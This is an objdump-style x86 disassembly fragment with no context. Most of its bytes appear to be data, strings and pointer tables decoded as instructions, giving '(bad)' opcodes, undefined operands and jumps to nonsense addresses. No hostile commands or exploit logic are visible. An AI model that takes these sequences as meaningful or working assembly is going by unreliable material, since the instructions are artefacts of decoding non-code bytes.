  423f24:	pop    esp
  423f25:	int    0x5f
  423f27:	ret    0xd26f
  423f2a:	outs   dx,BYTE PTR ds:[esi]
  423f2b:	sar    DWORD PTR [esi-0x1d],cl
  423f2e:	jns    0x423f10
  423f30:	aas    
  423f31:	dec    esi
  423f32:	mov    cs,WORD PTR [edi+0x30]
  423f35:	dec    esi
  423f36:	lods   al,BYTE PTR ds:[esi]
  423f37:	dec    edi
  423f38:	cmp    eax,0x394f834e
  423f3d:	dec    esi
  423f3e:	mov    ds:0x304e3a4f,al
  423f43:	dec    esi
  423f44:	inc    esp
  423f45:	dec    esi
  423f46:	pop    esp
  423f47:	fstp   QWORD PTR [edi-0x2e]
  423f4a:	outs   dx,DWORD PTR ds:[esi]
  423f4b:	loop   0x423fbb
  423f4d:	jecxz  0x423fcd
  423f4f:	repz jns 0x423f42
  423f52:	aas    
  423f53:	dec    esi
  423f54:	lea    ecx,[edi+0x30]
  423f57:	dec    esi
  423f58:	lahf   
  423f59:	dec    edi
  423f5a:	cmp    eax,0x3c4fa04e
  423f5f:	dec    esi
  423f60:	xor    BYTE PTR [esi+0x3f],cl
  423f63:	dec    esi
  423f64:	pop    esp
  423f65:	in     eax,dx
  423f66:	pop    edi
  423f67:	loop   0x423fd8
  423f69:	repnz outs dx,BYTE PTR ds:[esi]
  423f6b:	repz jle 0x423f71
  423f6e:	jns    0x423f70
  423f70:	jle    0x423f85
  423f72:	jns    0x423f84
  423f74:	cmp    al,0x4e
  423f76:	jg     0x423fc6
  423f78:	xor    BYTE PTR [esi-0x65],cl
  423f7b:	dec    edi
  423f7c:	xor    cl,BYTE PTR [esi-0x80]
  423f7f:	dec    edi
  423f80:	cmp    al,0x4e
  423f82:	lods   eax,DWORD PTR ds:[esi]
  423f83:	dec    edi
  423f84:	cmp    ecx,DWORD PTR [esi+0x30]
  423f87:	dec    esi
  423f88:	inc    ebp
  423f89:	dec    esi
  423f8a:	pop    esp
  423f8b:	or     eax,0x126f025f
  423f90:	outs   dx,BYTE PTR ds:[esi]
  423f91:	adc    edi,DWORD PTR [esi+0x23]
  423f94:	jns    0x423fb6
  423f96:	aas    
  423f97:	dec    esi
  423f98:	add    BYTE PTR [eax],al
  423f9a:	and    bh,BYTE PTR [esi]
  423f9c:	inc    edx
  423f9d:	add    BYTE PTR [esi],dl
  423f9f:	inc    eax
  423fa0:	inc    edx
  423fa1:	add    BYTE PTR [esi],bl
  423fa3:	inc    eax
  423fa4:	inc    edx
  423fa5:	add    BYTE PTR [edx+0x22004241],bh
  423fab:	inc    ecx
  423fac:	inc    edx
  423fad:	add    BYTE PTR [edx-0x1ffbdbf],ch
  423fb3:	aas    
  423fb4:	inc    edx
  423fb5:	add    BYTE PTR [edx],al
  423fb7:	inc    eax
  423fb8:	inc    edx
  423fb9:	add    BYTE PTR [esi+0x66004241],ah
  423fbf:	inc    eax
  423fc0:	inc    edx
  423fc1:	add    BYTE PTR ds:0x36f89ca9,cl
  423fc7:	mov    edx,0x401af89c
  423fcc:	inc    edx
  423fcd:	add    dh,bl
  423fcf:	inc    eax
  423fd0:	inc    edx
  423fd1:	add    dl,dh
  423fd3:	inc    eax
  423fd4:	inc    edx
  423fd5:	add    dh,bh
  423fd7:	inc    eax
  423fd8:	inc    edx
  423fd9:	add    BYTE PTR [esi],cl
  423fdb:	inc    ecx
  423fdc:	inc    edx
  423fdd:	add    BYTE PTR [edx+0x40],dl
  423fe0:	inc    edx
  423fe1:	add    BYTE PTR [esi],bl
  423fe3:	ds inc edx
  423fe5:	add    BYTE PTR [edx+0x40],dh
  423fe8:	inc    edx
  423fe9:	add    BYTE PTR [edx+0x40],ah
  423fec:	inc    edx
  423fed:	add    BYTE PTR [esi-0x49ffbdbf],bh
  423ff3:	test   DWORD PTR [eax+edi*8-0x7ee8f4e7],ebx
  423ffa:	es inc eax
  423ffc:	inc    edx
  423ffd:	add    BYTE PTR [esp+ebx*1],dl
  424000:	push   ss
  424001:	or     DWORD PTR [eax],0x7050d
  424007:	add    BYTE PTR [eax+0x0],al
  42400a:	cmp    al,BYTE PTR [edx+0x3e]
  42400d:	ds mov edx,0x6d004287
  424013:	push   ebp
  424014:	inc    esp
  424015:	imul   ecx,DWORD PTR [eax],0x86275fa
  42401b:	in     eax,dx
  42401c:	inc    BYTE PTR [edi]
  42401e:	aas    
  42401f:	cli    
  424020:	mov    ds:0x42400e05,eax
  424025:	add    BYTE PTR [ebp-0x4a07636b],dh
  42402b:	xchg   esi,eax
  42402c:	pushf  
  42402d:	clc    
  42402e:	mov    ah,0x95
  424030:	pushf  
  424031:	clc    
  424032:	mov    ebx,0xbaf89c95
  424037:	xchg   ebp,eax
  424038:	pushf  
  424039:	clc    
  42403a:	mov    ecx,0xb8f89c95
  42403f:	xchg   ebp,eax
  424040:	pushf  
  424041:	clc    
  424042:	mov    edi,0xbef89c95
  424047:	xchg   ebp,eax
  424048:	pushf  
  424049:	clc    
  42404a:	mov    ebp,0xa6f89c95
  42404f:	xchg   ebp,eax
  424050:	pushf  
  424051:	clc    
  424052:	jmp    0x423e:0x166003f9
  424059:	add    BYTE PTR [eax+edx*2+0x42],bh
  42405d:	add    BYTE PTR [ebx+0x77],dl
  424060:	jbe    0x4240b2
  424062:	mov    dh,0x85
  424064:	pushf  
  424065:	clc    
  424066:	sbb    ecx,ebp
  424068:	push   eax
  424069:	pop    es
  42406a:	in     eax,0x7
  42406c:	add    BYTE PTR [eax],al
  42406e:	adc    bh,BYTE PTR [esi]
  424070:	inc    edx
  424071:	add    BYTE PTR [ebx],bl
  424073:	or     eax,DWORD PTR [esi+ecx*1]
	...
  4240a6:	jl     0x4240f8
  4240a8:	inc    edx
  4240a9:	add    BYTE PTR [esi+0x68f89c85],dh
  4240af:	jne    0x42412a
  4240b1:	je     0x424128
  4240b3:	jns    0x424129
  4240b5:	jb     0x42411f
  4240b7:	addr16 pushw 0x68
  4240bb:	imul   esp,DWORD PTR [bx+0x68],0x0
  4240c0:	add    BYTE PTR [eax],al
  4240c2:	addr16 pushw 0x68
  4240c6:	addr16 push 0x67
  4240c9:	pushw  0x6b6a
  4240cd:	push   0x676b67
	...
  4240da:	jle    0x424062
  4240dc:	inc    eax
  4240dd:	add    BYTE PTR [ebp-0x5db060b1],ah
  4240e3:	dec    edi
  4240e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4240e5:	dec    edi
  4240e6:	lahf   
  4240e7:	dec    edi
  4240e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4240e9:	dec    edi
  4240ea:	ins    DWORD PTR es:[edi],dx
  4240eb:	dec    esi
  4240ec:	bound  ecx,QWORD PTR [esi+0x30]
  4240ef:	dec    esi
  4240f0:	add    BYTE PTR [eax],al
  4240f2:	cdq    
  4240f3:	dec    edi
  4240f4:	pushf  
  4240f5:	dec    edi
  4240f6:	fwait
  4240f7:	dec    edi
  4240f8:	ins    DWORD PTR es:[edi],dx
  4240f9:	dec    esi
  4240fa:	bound  ecx,QWORD PTR [esi+0x30]
  4240fd:	dec    esi
  4240fe:	scas   eax,DWORD PTR es:[edi]
  4240ff:	dec    edi
  424100:	lods   eax,DWORD PTR ds:[esi]
  424101:	dec    edi
  424102:	lahf   
  424103:	dec    edi
  424104:	mov    ds:0x624e6d4f,al
  424109:	dec    esi
  42410a:	xor    BYTE PTR [esi+0x0],cl
  42410d:	add    BYTE PTR [ebp-0x5bb067b1],ch
  424113:	dec    edi
  424114:	test   eax,0xa04f934f
  424119:	dec    edi
  42411a:	fwait
  42411b:	dec    edi
  42411c:	xor    BYTE PTR [esi+0x0],cl
  42411f:	add    BYTE PTR [eax],al
  424121:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  424128:	mov    WORD PTR [ebp-0x32734274],gs
  42412e:	mov    ebp,ds
  424130:	mov    ebp,gs
  424132:	mov    ebp,?
  424134:	mov    WORD PTR ds:0x2d8c1d8c,cs
  42413a:	mov    WORD PTR ds:0x6d8c5d8c,?
  424140:	mov    WORD PTR [edx-0x74],?
  424143:	jae    0x4240d1
  424145:	jo     0x4240d3
  424147:	jno    0x4240d5
  424149:	jbe    0x4240d7
  42414b:	ja     0x4240d9
  42414d:	je     0x4240db
  42414f:	jne    0x4240dd
  424151:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  424158:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  42415e:	lods   al,BYTE PTR ds:[esi]
  42415f:	jge    0x42411d
  424161:	jge    0x424101
  424163:	(bad)  
  424164:	jns    0x4241d9
  424166:	mov    ecx,0x7d738cb1
  42416b:	ins    DWORD PTR es:[edi],dx
  42416c:	enter  0x9fc6,0x26
  424170:	jb     0x424175
  424172:	test   eax,0xb956bb17
  424177:	hlt    
  424178:	test   al,0x37
  42417a:	test   al,0x7e
  42417c:	fnstenv [ecx-0x6a]
  42417f:	mov    cl,0x6a
  424181:	push   0xffffffce
  424183:	or     BYTE PTR [edx],bl
  424185:	xlat   BYTE PTR ds:[ebx]
  424186:	out    dx,eax
  424187:	add    eax,0x9321d7aa
  42418c:	scas   al,BYTE PTR es:[edi]
  42418d:	adc    DWORD PTR [esi],esp
  42418f:	jge    0x4241b4
  424191:	fidiv  WORD PTR [edi]
  424193:	leave  
  424194:	hlt    
  424195:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424196:	cmp    ax,0x1fc8
  42419a:	mov    dh,cl
  42419c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42419d:	(bad)  
  42419e:	and    DWORD PTR [eax],ebx
  4241a0:	and    DWORD PTR [ecx+0x0],esi
  4241a3:	add    BYTE PTR [eax],al
  4241a5:	add    al,ch
  4241a7:	(bad)  [ebx+0x7]
  4241aa:	cmc    
  4241ab:	enter  0x301a,0x10
  4241af:	push   eax
  4241b0:	inc    edx
  4241b1:	add    BYTE PTR [ecx+0x66],dh
  4241b4:	jp     0x424224
  4241b6:	push   es
  4241b7:	inc    eax
  4241b8:	inc    edx
  4241b9:	add    BYTE PTR [edx+0x40],ch
  4241bc:	inc    edx
  4241bd:	add    BYTE PTR [eax],cl
  4241bf:	in     eax,dx
  4241c0:	adc    al,BYTE PTR [edi]
  4241c2:	pop    ecx
  4241c3:	inc    ebx
  4241c4:	inc    edx
  4241c5:	outs   dx,BYTE PTR ds:[esi]
  4241c6:	popa   
  4241c7:	imul   eax,DWORD PTR [edx+0x61],0x6b
  4241cb:	jne    0x42423b
  4241cd:	dec    ebx
  4241ce:	je     0x424233
  4241d0:	bound  esp,QWORD PTR [edi+0x78]
  4241d3:	dec    eax
  4241d4:	bound  edx,QWORD PTR [ebx+0x53]
  4241d7:	inc    ebx
  4241d8:	push   ebp
  4241d9:	push   eax
  4241da:	ja     0x424256
  4241dc:	jp     0x42422b
  4241de:	push   esi
  4241df:	arpl   WORD PTR gs:[ecx+0x45],si
  4241e3:	dec    edx
  4241e4:	dec    esi
  4241e5:	data16 ja 0x424236
  4241e8:	imul   ebp,DWORD PTR [eax+0x0],0x0
	...
  4241fb:	add    BYTE PTR [eax],al
  4241fd:	add    BYTE PTR [edi+0x6c],ch
  424200:	push   0x49657557
  424205:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  42420b:	push   edi
  42420c:	je     0x424283
  42420e:	push   0x66
  424210:	jbe    0x424254
  424212:	jo     0x42425d
  424214:	dec    ebp
  424215:	dec    ebp
  424216:	pop    edx
  424217:	jp     0x424273
  424219:	jbe    0x424261
  42421b:	pop    ecx
  42421c:	jo     0x424296
  42421e:	push   edi
  42421f:	jbe    0x424268
  424221:	ja     0x424266
  424223:	js     0x42426d
  424225:	jno    0x42426f
  424227:	inc    ebp
  424228:	inc    esp
  424229:	inc    esp
  42422a:	push   ecx
  42422b:	dec    edx
  42422c:	ins    BYTE PTR es:[edi],dx
  42422d:	dec    ebx
  42422e:	jbe    0x42429e
  424230:	pop    eax
  424231:	jbe    0x424233
  424233:	add    BYTE PTR [ecx+0x46],al
  424236:	jae    0x4242ae
  424238:	dec    ebx
  424239:	gs js  0x4242a2
  42423c:	ins    BYTE PTR es:[edi],dx
  42423d:	jp     0x42423f
  42423f:	add    BYTE PTR [ebx+0x41],cl
  424242:	fs gs jno 0x4242b3
  424246:	push   ebx
  424247:	inc    ecx
  424248:	inc    ebx
  424249:	outs   dx,BYTE PTR ds:[esi]
  42424a:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  42424e:	push   edx
  42424f:	push   ecx
  424250:	push   0x43000064
  424255:	pop    eax
  424256:	outs   dx,DWORD PTR ds:[esi]
  424257:	push   0x66694355
  42425c:	dec    edi
  42425d:	je     0x4242ab
  42425f:	jo     0x424261
  424261:	add    BYTE PTR [ebx+0x6f],dl
  424264:	inc    edi
  424265:	dec    esi
  424266:	outs   dx,DWORD PTR ds:[esi]
  424267:	pop    ecx
  424268:	inc    edi
  424269:	jb     0x4242b2
  42426b:	jns    0x4242e3
  42426d:	inc    ecx
  42426e:	pop    eax
  42426f:	add    BYTE PTR [edi+0x67],dh
  424272:	dec    edi
  424273:	dec    esp
  424274:	dec    ebp
  424275:	inc    edx
  424276:	jno    0x4242e9
  424278:	jae    0x4242cd
  42427a:	push   eax
  42427b:	arpl   WORD PTR [eax],ax
  42427d:	add    BYTE PTR [ecx+edi*2+0x45],cl
  424281:	bound  ebp,QWORD PTR [ecx+0x46]
  424284:	dec    ecx
  424285:	ja     0x4242cc
  424287:	dec    eax
  424288:	inc    ebp
  424289:	inc    edx
  42428a:	push   ebx
  42428b:	push   ecx
  42428c:	add    BYTE PTR [eax],al
  42428e:	outs   dx,BYTE PTR ds:[esi]
  42428f:	dec    eax
  424290:	jno    0x4242eb
  424292:	jbe    0x4242e0
  424294:	ins    BYTE PTR es:[edi],dx
  424295:	inc    edx
  424296:	push   0x73
  42429b:	add    BYTE PTR [eax],al
  42429d:	add    BYTE PTR [eax],al
  42429f:	add    BYTE PTR [eax],al
  4242a1:	add    BYTE PTR [edx+0x44],bl
  4242a4:	jbe    0x4242ef
  4242a6:	imul   ecx,DWORD PTR [esi+0x6e],0x66
  4242aa:	ins    DWORD PTR es:[di],dx
  4242ac:	je     0x4242f5
  4242ae:	ins    BYTE PTR es:[edi],dx
  4242af:	jae    0x42431b
  4242b1:	inc    esi
  4242b2:	ins    DWORD PTR es:[edi],dx
  4242b3:	je     0x42430b
  4242b5:	push   0x56584178
  4242ba:	push   ebx
  4242bb:	addr16 dec edx
  4242bd:	jo     0x424331
  4242bf:	js     0x424330
  4242c1:	pop    eax
  4242c2:	dec    ebx
  4242c3:	push   esp
  4242c4:	dec    esp
  4242c5:	jns    0x424312
  4242c7:	js     0x424341
  4242c9:	outs   dx,BYTE PTR ds:[esi]
  4242ca:	pop    ecx
  4242cb:	jae    0x42433b
  4242cd:	push   0x43644448
  4242d2:	arpl   WORD PTR [edx+0x55],sp
  4242d5:	push   0x42504e67
  4242da:	push   ebp
  4242db:	je     0x424352
  4242dd:	addr16 dec edi
  4242df:	dec    esp
  4242e0:	inc    edx
  4242e1:	ins    DWORD PTR es:[edi],dx
  4242e2:	inc    esi
  4242e3:	inc    esi
  4242e4:	inc    esi
  4242e5:	arpl   WORD PTR [edx+0x47],bx
  4242e8:	push   ebp
  4242e9:	inc    ebx
  4242ea:	popa   
  4242eb:	push   edx
  4242ec:	dec    esp
  4242ed:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  4242f4:	push   ecx
  4242f5:	push   ebx
  4242f6:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  4242fd:	dec    edx
  4242fe:	jns    0x424369
  424300:	push   edx
  424301:	inc    ebx
  424302:	jo     0x424379
  424304:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  424308:	fs add al,dl
  42430b:	inc    edx
  42430c:	add    BYTE PTR [eax+edx*8],al
  42430f:	inc    edx
  424310:	add    BYTE PTR [eax],cl
  424312:	rol    BYTE PTR [edx+0x0],1
  424315:	or     al,0xd0
  424317:	inc    edx
  424318:	add    BYTE PTR [eax],dl
  42431a:	rol    BYTE PTR [edx+0x0],1
  42431d:	adc    al,0xd0
  42431f:	inc    edx
  424320:	add    BYTE PTR [eax],bl
  424322:	rol    BYTE PTR [edx+0x0],1
  424325:	sbb    al,0xd0
  424327:	inc    edx
  424328:	add    BYTE PTR [edi+0x37],al
  42432b:	cmp    BYTE PTR [edi+0x4b],bl
  42432e:	inc    ecx
  42432f:	aaa    
  424330:	dec    ecx
  424331:	ss pop edi
  424333:	xor    BYTE PTR [eax+0x35],dl
  424336:	dec    esi
  424337:	add    BYTE PTR [eax+0x49],cl
  42433a:	xor    al,0x5f
  42433c:	dec    esp
  42433d:	inc    esp
  42433e:	dec    esp
  42433f:	xor    bl,BYTE PTR [edi+0x35]
  424342:	dec    eax
  424343:	xor    BYTE PTR [eax],al
  424345:	dec    esp
  424346:	inc    ecx
  424347:	xor    al,0x5f
  424349:	dec    ebx
  42434a:	pop    edx
  42434b:	xor    esi,DWORD PTR [ebx]
  42434d:	dec    ebp
  42434e:	pop    edi
  42434f:	xor    al,0x0
  424351:	pop    ecx
  424352:	inc    esi
  424353:	push   eax
  424354:	aaa    
  424355:	xor    DWORD PTR [edx],esi
  424357:	pop    edi
  424358:	cmp    DWORD PTR [eax+eax*1+0x45],ecx
  42435c:	xor    eax,0x33595f41
  424361:	aaa    
  424362:	push   edx
  424363:	xor    bl,BYTE PTR [edi+0x4c]
  424366:	pop    edx
  424367:	add    BYTE PTR [edx+0x45],cl
  42436a:	push   ebx
  42436b:	xor    DWORD PTR [edi+0x43],ebx
  42436e:	dec    esp
  42436f:	inc    esi
  424370:	add    BYTE PTR [eax+0x58],bl
  424373:	xor    eax,0x444e515f
  424378:	xor    eax,0x4300425f
  42437d:	inc    ecx
  42437e:	dec    ebx
  42437f:	cmp    DWORD PTR ds:0x365f3939,esi
  424385:	xor    al,0x42
  424387:	pop    edi
  424388:	pop    eax
  424389:	push   edi
  42438a:	add    BYTE PTR [ebx+0x45],cl
  42438d:	cmp    DWORD PTR ss:[edi+0x56],ebx
  424391:	xor    eax,DWORD PTR [esi+0x4c]
  424394:	add    BYTE PTR [ebp+0x53],cl
  424397:	dec    edi
  424398:	pop    edi
  424399:	push   ebx
  42439a:	inc    ebx
  42439b:	xor    al,0x5f
  42439d:	inc    ebx
  42439e:	push   ebp
  42439f:	xor    eax,DWORD PTR [ecx+0x0]
  4243a2:	dec    esi
  4243a3:	inc    esi
  4243a4:	xor    eax,0x494f345f
  4243a9:	xor    ecx,DWORD PTR [esi+0x5f]
  4243ac:	push   esp
  4243ad:	cmp    BYTE PTR [esi+0x0],dl
  4243b0:	pop    edx
  4243b1:	xor    esi,DWORD PTR [esi]
  4243b3:	aaa    
  4243b4:	pop    edi
  4243b5:	xor    eax,0x5f363437
  4243ba:	push   edi
  4243bb:	add    BYTE PTR [ebp+0x4a],cl
  4243be:	push   edx
  4243bf:	pop    edi
  4243c0:	xor    DWORD PTR [edx],esi
  4243c2:	inc    ebp
  4243c3:	inc    edx
  4243c4:	ss pop edi
  4243c6:	inc    ecx
  4243c7:	dec    ebx
  4243c8:	add    BYTE PTR [edx+0x54],cl
  4243cb:	dec    edi
  4243cc:	pop    edi
  4243cd:	push   esp
  4243ce:	cmp    BYTE PTR [eax],dh
  4243d0:	inc    edi
  4243d1:	add    BYTE PTR [ecx+esi*1+0x4d],al
  4243d5:	pop    edi
  4243d6:	xor    DWORD PTR [ebp+0x57],eax
  4243d9:	pop    edx
  4243da:	cmp    BYTE PTR ss:[edi+0x38],bl
  4243de:	inc    ebp
  4243df:	dec    edi
  4243e0:	add    BYTE PTR [eax+0x53],cl
  4243e3:	xor    DWORD PTR [ecx],edi
  4243e5:	pop    edi
  4243e6:	dec    ebx
  4243e7:	inc    edx
  4243e8:	push   esp
  4243e9:	pop    edi
  4243ea:	push   esi
  4243eb:	add    BYTE PTR [ecx+0x49],al
  4243ee:	dec    edx
  4243ef:	pop    edi
  4243f0:	xor    eax,0x33344d4d
  4243f5:	pop    edi
  4243f6:	push   ecx
  4243f7:	inc    esi
  4243f8:	inc    edi
  4243f9:	dec    edi
  4243fa:	add    BYTE PTR [esi+0x4b],dl
  4243fd:	push   edx
  4243fe:	pop    edi
  4243ff:	inc    ebx
  424400:	pop    ecx
  424401:	xor    ebx,DWORD PTR [edi+0x35]
  424404:	inc    edi
  424405:	dec    eax
  424406:	xor    BYTE PTR [edx+0x0],al
  424409:	push   esi
  42440a:	xor    eax,0x315f3452
  42440f:	ss inc esp
  424411:	xor    eax,0x5956004a
  424416:	inc    ecx
  424417:	pop    edi
  424418:	push   esi
  424419:	push   ebp
  42441a:	inc    ebp
  42441b:	pop    edi
  42441c:	xor    BYTE PTR [ecx],dh
  42441e:	add    BYTE PTR [edi+0x58],al
  424421:	dec    edx
  424422:	pop    edi
  424423:	inc    edi
  424424:	inc    esi
  424425:	push   esi
  424426:	dec    esp
  424427:	push   edi
  424428:	add    BYTE PTR [edi+0x35],al
  42442b:	dec    ebx
  42442c:	pop    edi
  42442d:	ss dec ebx
  42442f:	xor    esi,DWORD PTR ds:0x33005600
  424435:	add    BYTE PTR [edi+0x0],dl
  424438:	xor    eax,0x5f003600
  42443d:	add    BYTE PTR [ecx+0x0],bl
  424440:	dec    eax
  424441:	add    BYTE PTR [ecx+0x0],bl
  424444:	inc    ebp
  424445:	add    BYTE PTR [eax+0x0],cl
  424448:	add    BYTE PTR [eax],al
  42444a:	push   eax
  42444b:	add    BYTE PTR [eax],dh
  42444d:	add    BYTE PTR [ecx+0x0],bl
  424450:	pop    edi
  424451:	add    BYTE PTR [ecx+0x0],bl
  424454:	xor    al,BYTE PTR [eax]
  424456:	dec    edi
  424457:	add    BYTE PTR [ebx],dh
  424459:	add    BYTE PTR [edi+0x0],dl
  42445c:	pop    edi
  42445d:	add    BYTE PTR [eax+eax*1+0x4f],al
  424461:	add    BYTE PTR [ebx+0x0],dl
  424464:	add    BYTE PTR [eax],al
  424466:	dec    ebp
  424467:	add    BYTE PTR [esi+0x0],dl
  42446a:	push   esp
  42446b:	add    BYTE PTR [edi+0x0],bl
  42446e:	inc    edx
  42446f:	add    BYTE PTR [edx+0x0],dl
  424472:	xor    al,0x0
  424474:	pop    edi
  424475:	add    BYTE PTR [ecx+0x0],al
  424478:	push   esp
  424479:	add    BYTE PTR [edx+0x0],dl
  42447c:	pop    edi
  42447d:	add    BYTE PTR [edi+0x0],cl
  424480:	xor    eax,DWORD PTR [eax]
  424482:	inc    edx
  424483:	add    BYTE PTR [eax],al
  424485:	add    BYTE PTR [esi+0x0],cl
  424488:	cmp    BYTE PTR [eax],al
  42448a:	push   eax
  42448b:	add    BYTE PTR [eax],dh
  42448d:	add    BYTE PTR [edi+0x0],bl
  424490:	push   edx
  424491:	add    BYTE PTR [edi+0x0],al
  424494:	inc    edx
  424495:	add    BYTE PTR [eax],bh
  424497:	add    BYTE PTR [eax+eax*1],dh
  42449a:	pop    edi
  42449b:	add    BYTE PTR [edi+0x0],cl
  42449e:	push   eax
  42449f:	add    BYTE PTR [esi],dh
  4244a1:	add    BYTE PTR [eax],al
  4244a3:	add    BYTE PTR [edx+0x0],bl
  4244a6:	pop    eax
  4244a7:	add    BYTE PTR [ecx],dh
  4244a9:	add    BYTE PTR [eax],bh
  4244ab:	add    BYTE PTR [edi+0x0],bl
  4244ae:	push   edi
  4244af:	add    BYTE PTR [edx+0x0],dl
  4244b2:	dec    ebx
  4244b3:	add    BYTE PTR [edi+0x0],bl
  4244b6:	inc    esp
  4244b7:	add    BYTE PTR [esi],dh
  4244b9:	add    BYTE PTR [ecx],bh
  4244bb:	add    BYTE PTR [esi],dh
  4244bd:	add    BYTE PTR [esi+0x0],dl
  4244c0:	add    BYTE PTR [eax],al
  4244c2:	push   ebp
  4244c3:	add    BYTE PTR [eax],dh
  4244c5:	add    BYTE PTR [eax+eax*1+0x5f],al
  4244c9:	add    BYTE PTR [edx+0x0],dl
  4244cc:	dec    ecx
  4244cd:	add    BYTE PTR [edi+0x0],cl
  4244d0:	xor    eax,DWORD PTR [eax]
  4244d2:	xor    eax,0x34005f00
  4244d7:	add    BYTE PTR [edi+0x0],cl
  4244da:	pop    ecx
  4244db:	add    BYTE PTR [eax],al
  4244dd:	add    BYTE PTR [eax+eax*1+0x31],cl
  4244e1:	add    BYTE PTR [esi+0x0],al
  4244e4:	pop    edi
  4244e5:	add    BYTE PTR [ebp+0x0],cl
  4244e8:	dec    ebp
  4244e9:	add    BYTE PTR [eax],bh
  4244eb:	add    BYTE PTR [esi],dh
  4244ed:	add    BYTE PTR [edx+0x0],al
  4244f0:	dec    esp
  4244f1:	add    BYTE PTR [eax],al
  4244f3:	add    BYTE PTR [edx+0x0],al
  4244f6:	xor    eax,0x5f003500
  4244fb:	add    BYTE PTR [eax+0x0],bl
  4244fe:	inc    esp
  4244ff:	add    BYTE PTR [edi+0x0],cl
  424502:	inc    ecx
  424503:	add    BYTE PTR [eax+eax*1],dh
  424506:	add    BYTE PTR [eax],al
  424508:	push   ecx
  424509:	add    BYTE PTR [eax],bh
  42450b:	add    BYTE PTR [ecx+0x0],dl
  42450e:	pop    edi
  42450f:	add    BYTE PTR [eax+eax*1+0x31],dl
  424513:	add    BYTE PTR [ecx],dh
  424515:	add    BYTE PTR [eax],bh
  424517:	add    BYTE PTR [edi+0x0],bl
  42451a:	aaa    
  42451b:	add    BYTE PTR [edx+0x0],al
  42451e:	add    BYTE PTR [eax],al
  424520:	push   edx
  424521:	add    BYTE PTR [ecx],bh
  424523:	add    BYTE PTR [esi+0x0],dl
  424526:	pop    edi
  424527:	add    BYTE PTR [eax+eax*1],dh
  42452a:	push   edx
  42452b:	add    BYTE PTR [ecx+0x0],bl
  42452e:	pop    edi
  42452f:	add    BYTE PTR [eax],bh
  424531:	add    BYTE PTR [eax],dh
  424533:	add    BYTE PTR [edx+0x0],bl
  424536:	add    BYTE PTR [eax],al
  424538:	add    BYTE PTR [eax],al
  42453a:	nop
  42453b:	inc    edx
  42453c:	add    BYTE PTR [eax+edx*4],al
  42453f:	inc    edx
  424540:	add    BYTE PTR [eax],cl
  424542:	nop
  424543:	inc    edx
  424544:	add    BYTE PTR [eax+edx*4],cl
  424547:	inc    edx
  424548:	add    BYTE PTR [eax],dl
  42454a:	nop
  42454b:	inc    edx
  42454c:	add    BYTE PTR [eax+edx*4],dl
  42454f:	inc    edx
  424550:	add    BYTE PTR [eax],bl
  424552:	nop
  424553:	inc    edx
  424554:	add    BYTE PTR [eax+edx*4],bl
  424557:	inc    edx
  424558:	add    BYTE PTR [eax],ah
  42455a:	nop
  42455b:	inc    edx
  42455c:	add    BYTE PTR [eax+edx*4],ah
  42455f:	inc    edx
  424560:	add    BYTE PTR [eax],ch
  424562:	nop
  424563:	inc    edx
	...
